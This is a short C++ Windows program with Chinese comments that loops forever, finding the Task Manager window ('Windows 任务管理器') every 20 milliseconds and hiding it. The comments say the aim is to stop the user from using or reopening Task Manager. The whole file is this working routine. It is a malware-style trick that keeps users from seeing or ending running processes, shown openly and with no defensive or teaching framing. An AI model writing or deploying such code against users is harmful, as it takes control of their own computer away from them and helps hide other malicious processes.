#include <windows.h>
#include <iostream>
using namespace std;

int main()  {	//寻找一个任务管理器并隐藏,用户不能再使用(或新打开)
	while (true) {
		HWND htaskmgr= ::FindWindow(NULL, "Windows 任务管理器");	//获取任务管理器
		::ShowWindow(htaskmgr, SW_HIDE);	//隐藏任务管理器
		::Sleep(20);
	}
	return 0;
};
